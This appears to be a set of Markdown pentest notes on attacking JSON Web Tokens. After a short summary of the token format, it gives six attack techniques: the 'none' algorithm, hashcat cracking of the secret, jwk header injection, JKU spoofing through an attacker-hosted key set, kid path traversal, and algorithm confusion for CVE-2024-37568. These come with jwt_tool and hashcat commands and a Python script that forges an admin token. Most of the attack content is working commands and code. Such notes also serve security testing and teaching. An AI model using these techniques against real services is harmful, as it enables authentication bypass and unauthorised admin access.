# [token.dev](token.dev)

# JWT Format

## JWS Specification

- Used for authentication and authorization

- contain JSON objects 

- Stored client side only

- Contains three parts:
    - Header (JOSE header):
        - "alg" : Thats the algorith used to sign the token
        - type : the  type of token(This is an optional element and if present for a JWT, it is recommended to use JWT as the media type.)
        - "kid":Looking at the kid, the recipient of the message should know where and how to lookup for the key and find it.
    - Payload: contains the claims
    - Signature

- The 3 parts are concatenated with a `.`

- ! Contains no spaces

- All parts are base64 encoded

### some known claims

- "iss" : The issuer of the token
- "azp"|"aud" : Google authorized Parties
- "sub" : Google specific userID
- "at_hash" : The hash of the access token 
- "iat" : Time since epoch the jwt created
- "exp" : Expires in 
- "nonce" : prevents replay attacks




# Attack #1 : Unsecured JWT

`A JWT can be either a JWS or a JWE object. Unsecured JWT is a JWS object where in the JOSE header the value of the "alg" element is set to none`


- Try to change the value of alg to "none"
- You can try then to leave the the old signature or remove it entirely.


# Attack #2 : Bruteforce the secret of the signature

```
$ hashcat -a 0 -m 16500 <jwt> <wordlist>
```


- Fix the signature

```
$ python3 jwt_tool.py "{jwt}" -S {Algorith} -p {secret}
```

# Attack #3 : header jwkey injection

- jwk (JSON Web Key) - Provides an embedded JSON object representing the public key that verify`s the signature

- If a server is not validating the contents of these parameters,or doesn`t compare the embeded key with the real one, it may be possible for an attacker to generate self-signed tokens that would be accepted by the server.

### Common JOSE Header structure 

```

{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}

```

- kid`s have to match each other
- n is the public key 

### Attack chain

`$ python3 jwt_tool "{token}" -X i -T`

- change the payload 

- make sure the 2 'kid' inside jose header match each other (jwt_tool creates keys with its own kid)

- jwt_tool takes care of rsa keys


# Attack #4 : Spoof JKU (JWT Key URL)

JKU allows you to specify a url a server might use to grab 
the key to verify the integrity of jwt

- the kid value in JOSE header can point to the right 
one in case there are more than one

the endpoint hosts a file with the above structure :

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

- This file is called the JSON Web Key Sets (JWKS) and can contain multiple keys.

- a JWK Set is usually serverd in the standard endpoint `/.well-known/jwks.json`

- "n" here represents the public key used to verify the signature of the jwt


### Exploit

`$ python3 jwt_tool "{token}" -X s -ju {exploit_server/keys.json} -T`

- jwt_tool will output the file in your home directory 

- it will also handle the craft of rsa keys

- ! make sure the kid`s in jose header again match as jwt_tool creates keys with its own kid

- host the Set file in your exploit server

- use the new token to exploit the target



# Attack #5 : Nullify kid


Parameter kid might be vulnerable to path traversal

So changing it to something like ../../../../../dev/null
and sign the token again with null password might
do the job


`$ python3 jwt_tool "{token}" -T -S hs256 -p ''`


# Attack #6 : Encryption Algorithm Confusion CVE-2024-37568

### Vulnerable Software

- authlib == ^1.3.0

In some instances , developers are not taking in consideration that 
the token might be anything else than signed with ,for example , rsa encryption,
even the the application is able to verify tokens signed with other algorithms aswell.

As a result , tokens signed with lets say MAC-SHA256 will still be treated as RSA.

This way we can spoof the encryption algorithm and bypass the verification.

### Step 1. Obtain the public key of the server

Some common endpoints where we might find the public keys are
`/jwks.json` or `/.well-known/jwks.json`

### Step 2 . Normalize the key

The public key needs to be in the exact format that the server is using it to verify the tokens.
Two aspects of this nature are :

- The format of the key (ex. X.509 PEM)
- The key itself as raw bytes(even non printable chars)
`echo -n '---BEG...' >key.pem`


### Step 3. Modify the Key 

- Change the kid to match if needed
- Change the algorithm to a symmetric encryption algorithm( ex. hs256)

[online tool](https://jwkset.com/inspect)

### Step 4. Sign the token

- The secret is now the public key


`$ python3 jwt_tool.py "{token}" -X k -pk key.pem -I -pc {claim name} -pv {claim value}`


### Py script to automate

```
import base64
from Crypto.PublicKey import RSA
import time
from authlib.jose import jwt
import os

# Provided JSON data
# TO BE REPLACED BY YOUR JWK SET
jwk_data = {
    "keys": [{"alg":"RS256","e":"AQAB","REPLACE":"RSA","n":"REPLACE","use":"sig"}]
}

# Convert Base64url to Base64
def base64url_to_base64(base64url):
    padding = '=' * (4 - len(base64url) % 4)
    return base64.urlsafe_b64decode(base64url + padding)

# Extract modulus (n) and exponent (e)
modulus = base64url_to_base64(jwk_data["keys"][0]["n"])
exponent = base64url_to_base64(jwk_data["keys"][0]["e"])

# Convert the modulus and exponent to integers
n = int.from_bytes(modulus, byteorder='big')
e = int.from_bytes(exponent, byteorder='big')

# Reconstruct the RSA public key
pub_key = RSA.construct((n, e))

# Export the public key in PEM format
pem_key = pub_key.export_key(format='PEM')

# Print the entire PEM key first
print("Full PEM Key:")
print(pem_key.decode('utf-8'))

# Save everything up to the last '-' character
pem_key_str = pem_key.decode('utf-8')
pem_key_cleaned = pem_key_str.rsplit('-', 1)[0]  # Split and keep only the part before the last '-', ensure no bad characters after the last '-'
pem_key_cleaned = pem_key_cleaned + '-' # Add the last -
# Print the cleaned PEM key
print("\nCleaned PEM Key (up to the last '-'):")
print(pem_key_cleaned)

# Optionally, save the cleaned PEM key to a file
with open('cleaned_pubkey.pem', 'w') as f:
    f.write(pem_key_cleaned)

def create_token(user):
    expiration_time = int(time.time()) + 3600  # 3600 seconds = 1 hour
    payload = {"username": user, "isAdmin": True, "exp": expiration_time}
    return jwt.encode({"alg": "HS256"}, payload, pem_key_cleaned).decode("utf-8")

print("Printing forged token: ")
print(create_token("bob"))
```


## Bruteforce the public key

you can derive the public key from two tokens signed from the server

`$ docker run --rm -it portswigger/sig2n <token1> <token2> `


- the output of the command has pairs of public keys and tokens which are not all valid


